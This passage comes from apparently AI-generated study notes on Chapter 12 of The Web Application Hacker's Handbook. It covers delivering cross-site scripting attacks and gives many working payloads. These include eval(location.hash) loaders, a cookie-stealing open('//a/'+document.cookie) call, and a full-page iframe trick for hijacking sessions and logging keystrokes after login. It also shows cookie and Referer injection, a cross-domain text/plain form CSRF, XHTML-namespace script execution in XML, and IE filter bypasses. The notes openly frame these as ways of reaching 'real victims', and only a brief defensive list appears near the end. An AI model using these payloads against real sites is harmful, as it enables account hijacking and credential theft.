  <script>eval(location.hash.slice(1))</script>
  ```
* The script grabs everything after the `#` and executes it as JS.

---

### ⚠️ Bonus: Even Shorter Version (Using `unescape`)

```
<script>eval(unescape(location))</script>
```

#### Why It Works:

This version:

* Decodes `%XX` encoded characters in the entire `location` string
* Turns the full URL into valid JS

#### Example:

```
http://vuln.com/xss?msg=<script>eval(unescape(location))</script>#%0Aalert(1)
```

* `%0A` → newline → ends `//` comment
* `http:` + `//` becomes a JS label and a comment
* `alert(1)` is outside the comment, and it runs

---

## 🔥 Summary Table

| Bypass Strategy       | Core Idea                               | Strength |
| --------------------- | --------------------------------------- | -------- |
| Shrink payload        | Use shorter syntax and small hostnames  | ⭐⭐       |
| Multi-field injection | Combine fragmented inputs across fields | ⭐⭐⭐⭐     |
| DOM-based injection   | Load full payload from fragment         | ⭐⭐⭐⭐⭐    |

---

## ✅ Real-World Applications

| Scenario                               | Bypass You Can Use                                               |
| -------------------------------------- | ---------------------------------------------------------------- |
| Only 30 chars allowed?                 | Use `open('//a/'+document.cookie)`                               |
| Every input field is limited?          | Combine payload across multiple fields                           |
| Filters block `<`, `>`, `"`, etc?      | Use `eval(location.hash.slice(1))` or `eval(unescape(location))` |
| Field allows only basic alphanumerics? | Base64 encode your payload and decode via `atob()`               |

---

## 🧠 TL;DR

* App limiting your input size? You can still hit it with:

  1. **Minimal JS payloads**
  2. **Split payloads across inputs using `/* ... */`**
  3. **Load your script from the URL hash (`#`) using DOM XSS**

* These techniques bypass both **input length** and **filtering logic**—especially when paired with prior obfuscation methods.

---

## 🎯 Delivering Working XSS Exploits

When you're testing XSS manually — especially using tools like **Burp Repeater** — you're usually:

* Replaying requests
* Modifying inputs bit-by-bit
* Watching how the app reflects that input in the response

But there's a difference between:

* ✅ **Proving** the XSS works to yourself (PoC)
* 🚀 **Delivering** a working attack to a real user

This section shows how to **bridge that gap** — even when:

* The entry point isn’t easy to control (e.g., Referer or Cookie headers)
* Users have modern browsers with **XSS protections**
* The vulnerable page is not part of the *sensitive* functionality

---

## 🧠 Challenge #1: Escalating Attack Scope to Other Pages

### 🔥 Problem:

You find XSS in a **low-value, public page**. But the sensitive data (e.g., account info, money transfers) is in **authenticated sections**.

### 🛠 Solution: **Persistence + Escalation via iframe**

Use XSS to inject a **script that persists** across navigation and **watches the user**.

---

### ✅ Exploit Plan:

1. Inject a payload that:

   * Loads an `<iframe>` over the full viewport
   * Re-loads the current site inside that iframe
   * Hooks into browser events
2. As the user logs in or browses, your **main window script stays active**.
3. You can:

   * Steal cookies or tokens
   * Intercept credentials (via keyloggers)
   * Monitor or clone form submissions
   * Use `pushState()` to make it seamless

---

### 🔍 Example:

```js
<iframe src="/login" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"></iframe>
<script>
window.addEventListener('message', function(e) {
  // capture postMessage data or hook events
});
</script>
```

Or for full control:

```js
document.body.innerHTML = "<iframe src='https://target.com' style='position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;'></iframe>";
```

With **`pushState()`**, you can even update the URL to match what the user expects as they browse:

```js
history.pushState({}, "", "/account/dashboard");
```

---

### 🚨 Common Myth:

> “XSS in public pages isn’t a threat. Users aren't even logged in yet.”

🔻 **Reality Check:**

* You can inject **persisting scripts** that wait silently
* Once the user logs in — **you hijack**
* Or worse — use a **keylogger** to capture credentials (we’ll cover this in Chapter 13)

🧠 *Unauthenticated XSS* is often **more dangerous** than authenticated XSS:

* It targets *everyone*, not just logged-in users
* It’s easier to **mass-exploit** (e.g., phishing links)

---

## 🧠 Challenge #2: Modifying the Request Method

### 🔥 Problem:

Your payload only works via **POST**, but your delivery mechanism (e.g., an `<img>` tag or email link) only uses **GET**.

---

### ✅ Solution A: Try Converting POST to GET

#### Why?

* Many apps accept **both** GET and POST methods
* Some parameters are **not method-sensitive**

You can use Burp Suite:

> **Right-click → Change request method (GET ↔ POST)**

---

### 💡 Real World:

* Web forums may accept an IMG tag like:

```html
<img src="https://victim.com/endpoint?xss_payload">
```

* But the vulnerable page only uses POST?
  → Try sending the payload as a **GET** anyway
  → The app *might* process it the same way

---

### 🚨 Common Myth:

> “If it doesn’t work with GET, the vulnerability isn’t exploitable.”

🔻 **Reality Check:**

* You can still exploit POST-only XSS via:

  * **CSRF-style POST submissions**
  * **JS fetch/XHR POST requests from malicious sites**
  * **Malicious browser extensions**

```js
fetch("https://victim.com/xss", {
  method: "POST",
  body: "name=<script>...</script>",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
});
```

---

### ✅ Solution B: Convert GET to POST to Bypass Filters

#### Scenario:

* Your GET request is **filtered** based on query parameters
* The WAF or app is scanning the URL itself for keywords

🔄 Convert your exploit to **POST**, place payload in body

#### Why It Works:

* Some filters inspect **only the query string**
* They ignore or poorly parse **POST bodies**

---

### 🔍 Example:

#### GET (blocked):

```
https://target.com/search?query=<script>alert(1)</script>
```

#### POST (might bypass filters):

```http
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=<script>alert(1)</script>
```

---

## 🛡️ Summary Table

| Scenario                                                    | Strategy                                               |
| ----------------------------------------------------------- | ------------------------------------------------------ |
| Public-page XSS but want access to sensitive areas          | Inject persistent script (iframe + pushState)          |
| Only works with POST, but need GET?                         | Test app behavior by converting to GET                 |
| GET is filtered, but POST isn’t?                            | Send same payload via POST                             |
| User input reflects in hard-to-control fields like headers? | Use CSRF or JS injection from attacker-controlled site |
| Concerned about protections like browser XSS filters?       | Encode, obfuscate, or trigger via user interaction     |

---

## 💡 Final Tip:

Many real-world exploits need **multiple tricks**:

* Persistent iframe + obfuscation
* POST method bypass + multi-field payload
* DOM-based persistence + event handling

What matters most isn't just proving the XSS exists — it's **delivering it effectively to real victims**, despite browser protections, user behavior, or filter logic.

---

Here’s your **complete breakdown** of the section **“Exploiting XSS via Cookies, Referer Headers, and Nonstandard Content”** from Chapter 12 of *The Web Application Hacker's Handbook*. Everything is covered in-depth with **realistic logic, payload flow, and attack mindset** — tailored like HTB Academy, just how you prefer.

---

## 🍪 Part 1: Exploiting XSS via Cookies

### 🎯 Core Idea:

If XSS payloads can be injected **through a Cookie**, and that cookie's value is **reflected into the response unsafely**, you're dealing with a **cookie-based reflected XSS**.

---

### 🧠 Challenge:

You don’t usually control another user’s cookies directly. So how do you make the victim’s browser send a **crafted cookie** that contains your payload?

---

### ✅ Four Exploitation Strategies:

---

### 1. 🔁 Cookie/URL Parameter Overlap

> **Test**: Can a URL or POST parameter override the cookie?

Example:

```http
Cookie: user=guest  
GET /profile?user=<script>alert(1)</script>
```

Some frameworks prioritize query/body parameters **over cookies**, especially if they share the same key name. If so, you can *skip cookie injection entirely* and go via query string — easier to control.

---

### 2. 🎯 CSRF to Set Cookie

**Exploit Flow**:

1. Victim visits **your malicious site**
2. Your JS sends a **CSRF request** to the target app that **sets the cookie**
3. The **next request** to the app includes that cookie → **XSS triggered**

#### Example:

Victim visits:

```html
<img src="https://vulnerable-app.com/setPrefs?theme=<script>alert(1)</script>">
```

If `/setPrefs` stores preferences in a cookie, boom — XSS will fire on the next page that reflects `theme`.

> 🔐 This only works if:
>
> * The cookie-setting endpoint is **CSRF-prone**
> * The value is reflected without proper output encoding

---

### 3. 💀 Legacy Plugin Exploits

Browser plugins (especially **Flash**) used to let attackers:

* Send requests with **arbitrary headers**, including `Cookie`
* **Bypass Same-Origin Policy** in some cases

#### Status:

* Mostly patched today
* But if you're in a legacy enterprise environment (think: intranet), this can still be abused

---

### 4. 🧠 Persistent XSS via Another Bug

If you’ve already found **any other XSS** on the same domain:

* Use it to **set a malicious cookie** via JavaScript:

```js
document.cookie = "prefs=<script>alert(1)</script>; path=/";
```

Now any page reflecting that cookie = persistent XSS.

---

## 🔎 Part 2: Exploiting XSS via the Referer Header

### 🎯 Core Idea:

Some apps reflect parts of the **Referer header** back into the response.

If unescaped → it can be a **reflected XSS vector**.

---

### ✅ Exploitation Strategy:

1. 🕸️ Victim visits your malicious site:

```html
<a href="https://evil.com/redirector">Click here</a>
```

2. Your server responds with:

```html
<script>
location.href = "https://vulnerable-app.com/page";
</script>
```

3. The victim’s browser:

   * Sends a GET request to `vulnerable-app.com/page`
   * **Includes your full evil URL** in the `Referer` header

4. If the app reflects that Referer without encoding → XSS fires.

---

### 🛠️ Extra Layer: Bypassing Same-Origin Referer Checks

Some apps **only reflect the Referer** if it’s from the same domain.

#### Trick:

Use an **on-site redirector** — e.g.,

```bash
https://target.com/redirect?next=https://target.com/page
```

Your attack:

```
https://target.com/redirect?next=https://target.com/page?<script>alert(1)</script>
```

→ If redirector does a **302 redirect**, browser updates Referer to include your payload.

✅ **Success depends on:**

* Redirect type (302 vs meta-refresh vs JS)
* Whether browser updates Referer on redirect (varies slightly per browser)

---

## 🧩 Part 3: Exploiting XSS via Nonstandard Request/Response Formats

### 🎯 Core Idea:

In modern apps (especially with **Ajax**, REST, or GraphQL), data is passed:

* As **JSON**, **XML**, or custom formats
* Not as traditional query strings

Some backends may **reflect raw input** (like JSON keys/values) into responses without output encoding.

---

### 🔐 But… Two Major Challenges:

---

### ❗ Challenge 1: Cross-Origin Request Restrictions

* Most of these endpoints are hit via **JavaScript (XHR, fetch)**
* JavaScript is bound by the **Same-Origin Policy**

✅ **HTML5 introduces CORS** — but only works if:

* The server sets `Access-Control-Allow-Origin`
* You’re allowed to make cross-origin calls

> If not — you can’t reach the vulnerable endpoint cross-origin via normal JS.

---

### ❗ Challenge 2: Script Injection into Non-HTML Responses

Even if reflection happens, the response might be:

* **JSON** → MIME type: `application/json`
* **XML** → MIME type: `application/xml`
* **Custom binary or serialized format**

🧠 Browsers don’t interpret these as HTML/JS by default.

---

### ✅ So how do we exploit it?

Let’s take **XML** as an example (next section will cover this in detail). The idea is:

* **Inject JavaScript inside a `<script>` tag** wrapped inside XML
* Use techniques to **force the browser** to treat the XML as HTML/JS

---

### 💣 Realistic Flow:

1. Your JS creates a `<script src="vulnerable-xml-endpoint?payload">` tag
2. The endpoint reflects your payload inside XML
3. The browser loads it in script context → **boom**

#### Extra Trick:

Sometimes, changing the response’s `Content-Type` (e.g., to `text/html`) can force rendering.

You can even use:

```html
<iframe srcdoc="payload here">
```

Or:

```js
let script = document.createElement("script");
script.src = "https://victim.com/api?json={...}";
document.body.appendChild(script);
```

---

## 🧠 Summary Mindmap

```text
🧠 Entry Point = Cookie?
├── Try overriding with query/body param
├── CSRF attack to set cookie value
├── Use legacy plugin bugs (if possible)
└── Use other XSS to set cookie (persistence)

🧠 Entry Point = Referer?
├── Deliver XSS via attacker-controlled Referer
└── Use redirectors to spoof same-origin Referer

🧠 Input/Output = JSON/XML?
├── Can’t cross-origin? → CORS required
├── Non-HTML response? → Force parsing
└── Inject into JSON/XML → Treat as script
```

---

## ✅ Key Takeaways:

* XSS isn’t just about `<script>alert(1)</script>` in GET params
* You must consider **where the input comes from** — headers, cookies, POST bodies, AJAX data
* Filter evasion and creative delivery is key: redirect chains, CSRF cookie setters, MIME abuse, and more
* Always test **browser behavior**, not just backend logic — rendering and parsing quirks matter a lot

---

## 🌐 Sending XML Requests Cross-Domain

### 🎯 Objective

How can an attacker **exploit an XSS-like flaw** in modern web applications that use **non-HTML content types** like XML or JSON?

---

## 🧪 Part 1: Sending Cross-Domain XML Requests (with Controlled Payload)

### 🧩 Problem:

The app expects **XML (or JSON)** in the request body.

But Same-Origin Policy (SOP) **prevents sending raw cross-domain requests** with `Content-Type: application/xml`.

---

### 💡 Solution: Abuse `<form enctype="text/plain">`

HTML forms can bypass SOP when:

* Method = `POST`
* Enctype = `text/plain`

### ✅ What this does:

* Each `<input>` becomes a line in the request body:
  `name=value`
* No URL encoding applied
* Resulting request body is raw text
* Works in **modern IE, Firefox, Opera**

---

### 📦 Exploit Strategy

Let’s say the app wants this XML payload:

```xml
<?xml version="1.0"?><data><param>foo</param></data>
```

You can't send that directly via JavaScript due to CORS restrictions — but you can trick the browser to send it using a crafted form.

### 👇 Here's how:

```html
<form enctype="text/plain" action="http://target.com/vuln.php" method="POST">
  <input type="hidden" name='<?xml version' value='"1.0"?><data><param>foo</param></data>'>
</form>
<script>document.forms[0].submit();</script>
```

### 📨 What gets sent:

```http
POST /vuln.php HTTP/1.1
Content-Type: text/plain

<?xml version="1.0"?><data><param>foo</param></data>
```

🔥 That’s valid XML — sent cross-domain — **without JavaScript or XHR**.

---

### 🔥 Bonus: Works for Other Formats Too (JSON, Binary, etc.)

As long as you can:

* Get **at least one `=`** in your payload
* Control both name and value around it

You can smuggle:

* JSON
* YAML
* Serialized binary formats
* etc.

#### Example (injecting into JSON):

```json
{ "name": "John", "email": "a@b.com", "comment": "=" }
```

Use:

```html
<input type="hidden" name='{ "name": "x",' value='"email":"a@b.com", "comment": "=" }'>
```

---

### ⚠️ Limitation:

This method **forces the request's Content-Type to `text/plain`**

If the server:

* Rejects requests with wrong `Content-Type`
* Or parses `application/xml`/`application/json` strictly

→ This technique **won’t work**.

---

### ✅ Pro tip:

**Always test** if the target endpoint works when the Content-Type is downgraded:

```http
Content-Type: text/plain
```

If it **still accepts and parses** your payload, you're golden.

---

## ⚙️ Part 2: Executing JavaScript from XML Responses

---

### 🎯 Problem:

You found a server that **reflects your input into an XML response**, like:

```http
Content-Type: text/xml
```

...but your payload **doesn’t execute**, because the browser doesn’t treat it as HTML.

---

### 🧠 Why?

Modern browsers follow:

* MIME sniffing rules
* Content-Type enforcement
* Script execution only in valid contexts

### So even if your payload contains:

```xml
<script>alert(1)</script>
```

→ The browser ignores it due to the `Content-Type: text/xml`.

---

## ✅ The Workaround: Use **XHTML Namespaces** to “Trick” the Browser

If you can inject into the XML body, you can define an **XHTML namespace** and wrap your JS in **browser-executable tags**.

---

### ✅ Working Payload:

```xml
HTTP/1.1 200 OK  
Content-Type: text/xml  

<xml>  
  <data>  
    ...  
    <a xmlns:a='http://www.w3.org/1999/xhtml'>  
      <a:body onload='alert(1)'/>  
    </a>  
  </data>  
</xml>
```

---

### 🧠 Why does this work?

* Firefox (and some other browsers) will parse this namespace `xmlns:a` as **HTML (XHTML)**
* `a:body` becomes equivalent to a real `<body>` element
* The `onload` handler fires as it would in normal HTML

---

### ✅ Conditions for Success:

1. The response must be:

   * Served with a loose or overrideable `Content-Type`
   * Or opened directly in a browser (not processed by JS)

2. Injection point must allow you to:

   * Control the namespace (`xmlns`)
   * Insert executable attributes (`onload`, `onclick`, etc.)

3. The injected tag **must not break** XML well-formedness

---

### ❌ When it fails:

* The XML is parsed as **data**, not markup
* The JS is reflected too deep into the tree to execute
* Strict CSP or X-Content-Type-Options are set
* Input is sanitized or encoded before being reflected

---

## 🧪 Summary Attack Flow

```text
Step 1️⃣  → Find endpoint that reflects XML or JSON
Step 2️⃣  → Try submitting XML using form + text/plain enctype
Step 3️⃣  → Observe if your XML is accepted & reflected
Step 4️⃣  → Try exploiting browser parsing via XHTML namespace
Step 5️⃣  → Inject <a:body onload='...'> to trigger JS
```

---

## 🧠 Mindset Key:

This is not a “copy-paste” style attack. It requires:

* Precise **control over structure**
* Understanding of **browser quirks**
* Knowledge of how **MIME sniffing, parsing, and XML namespaces** interact

You're not just injecting a script — you're **tricking the document parser** into parsing non-HTML data as if it were HTML.

---

## ✅ Takeaways

| Concept                | Key Point                                           |
| ---------------------- | --------------------------------------------------- |
| `enctype="text/plain"` | Sends cross-domain POSTs with raw body              |
| `=` character          | Mandatory for `name=value` pair construction        |
| `Content-Type`         | Must be tolerated by backend for this trick to work |
| XHTML namespace        | Turns XML into browser-executable HTML              |
| `a:body onload=...`    | Executes JavaScript inside `text/xml` content       |

---

## 🛡️ Attacking Browser XSS Filters

### 🧠 Context:

Even if an application is vulnerable to **reflected XSS**, the attack might **fail in the real world** if the browser intercepts and **neuters the payload** before it can execute.

This section examines:

* How browser XSS filters work (especially Internet Explorer’s)
* How to **bypass them**
* How to **exploit their quirks**

---

## 📌 TL;DR (If you're scanning fast):

| 💥 Concept                                                   | ✅ Bypass Technique                                      |
| ------------------------------------------------------------ | ------------------------------------------------------- |
| IE only checks **parameter values**, not names               | Inject payload into parameter names                     |
| IE checks parameters **individually**, not combined          | Split payload across multiple values                    |
| IE only filters **cross-site requests**                      | Host payload on-site or use link injection              |
| IE filters **after the fact**, not proactively               | Poison it with intentional overlaps                     |
| IE can be tricked into **self-sabotaging** the app’s real JS | Kill legit scripts to change context or remove defenses |

---

## 🧩 How the IE XSS Filter Works (Simplified)

1. Monitors **incoming requests** and **outgoing responses**
2. Looks for **script-like input in request parameters**
3. If found, checks if **same string appears in response**
4. If match found → attempts to **neutralize script** in response
   (e.g. `<script>` becomes `<sc#ipt>`)

---

## 💡 Important Observations

### ✅ IE's Filter Only Examines:

* **Parameter values** — not names
* **Each value individually** — no multi-param correlation
* **Cross-domain requests** — not same-site

---

## 🚨 Bypass Techniques in Detail

---

## 1. 🔐 Exploiting Blind Spots

### a. **Parameter Names Not Inspected**

IE looks **only at values**, so if the vulnerable reflection is based on a parameter **name**, IE **won’t block it**.

#### 🔥 Example:

```http
GET /search?<script>=x HTTP/1.1
```

If the server reflects the full query string, the attack **slips through** IE’s net.

---

### b. **Split Payload Across Parameters (Beating Regex Matching)**

IE checks parameters **in isolation**.

So you can **split** a payload across multiple fields:

```http
GET /error?x=<scr&y=ipt>alert(1)</script>
```

This **bypasses** the regex blacklist because:

* Neither `x` nor `y` triggers filtering alone
* The server might **concatenate** them, executing the full payload

---

### c. **Duplicate Parameters (Multi-Valued Injection)**

Some frameworks (e.g. ASP.NET) **join multiple parameter values** with commas:

```http
GET /page?p=foo&p=bar
```

App sees:

```python
p = "foo,bar"
```

But IE processes them **separately**, so you can **sneak in a payload** that’s harmless in isolation but deadly when combined.

#### 🧪 Try this payload:

```http
GET /error?message=<scr%00ipt&message=>alert(1)</script>
```

* `%00` (NULL byte) bypasses regex
* IE doesn’t connect the two values
* App combines them into a **working script**

---

### d. **Same-Site Requests Are Unfiltered**

IE **only filters cross-domain traffic** (for performance reasons)

So if you can:

1. Inject a **malicious link** on-site (e.g., via open redirect or forum post)
2. Trick the user into **clicking it**

→ IE doesn’t intervene, and the payload executes.

---

## 2. 🔄 Using the Filter *Against* Itself (Script Neutralization Abuse)

---

### 🤯 What if the filter **removes good code** from the page?

Here's the trick:

1. **Inject part of the app's real script** into your parameter
2. IE sees it’s echoed → neuters it
3. App code is now broken/missing

### 💥 Result:

* **Context shift**: now you can inject payloads that weren’t possible before
* Or worse: you’ve broken **security logic** (like CSRF protection or framebusting)

---

### 🛠️ Real-World Use Case

Let’s say the page contains this legit code:

```html
<script>var loggedIn = true;</script>
```

You send a request like:

```http
GET /login?msg=var loggedIn = true;
```

* Filter sees match → **neuters** the reflected script
* Now that JS block is **broken**
* Your payload (maybe in another param) is now evaluated in a **new context**

→ You win.

---

## 💡 Real-World Impact

| Browser                  | Impact                                                    |
| ------------------------ | --------------------------------------------------------- |
| Internet Explorer        | Vulnerable to everything above                            |
| Chrome & Firefox         | Have smarter, opt-in XSS protections                      |
| Edge, Safari             | Don’t rely on this kind of filter                         |
| **Modern best practice** | Rely on **Content Security Policy**, not reactive filters |

---

## 🛡️ Defensive Measures (Dev Perspective)

* **Never rely on browser filters** for protection
* Sanitize inputs **server-side and client-side**
* Use **Content Security Policy (CSP)** to harden JS execution
* Disallow duplicate parameters (`p=foo&p=bar`) at the server level
* Avoid reflecting parameter names or full query strings in the response

---

## 🧠 Recap Attack Table

| Technique                | How It Works                                           |
| ------------------------ | ------------------------------------------------------ |
| **Param Name Injection** | Inject XSS into the parameter name                     |
| **Split Across Params**  | Bypass filter by breaking payload into harmless chunks |
| **Multi-Param Values**   | App joins values; filter doesn't → bypass              |
| **On-Site Links**        | Filter only blocks cross-site traffic                  |
| **Filter Self-Sabotage** | Cause IE to neutralize app’s own JS                    |
| **Null Byte Injection**  | `%00` breaks regex-based filters                       |
| **Regex Evasion**        | Use obfuscation to avoid blacklisted terms             |

---

## 🎯 Final Words

The IE XSS filter is **no longer the standard defense**, but learning how to bypass it teaches you:

* How **blacklist-based** protection fails
* How attackers can turn **defenses into vulnerabilities**
* Why **input validation and output encoding** are always better than filters

---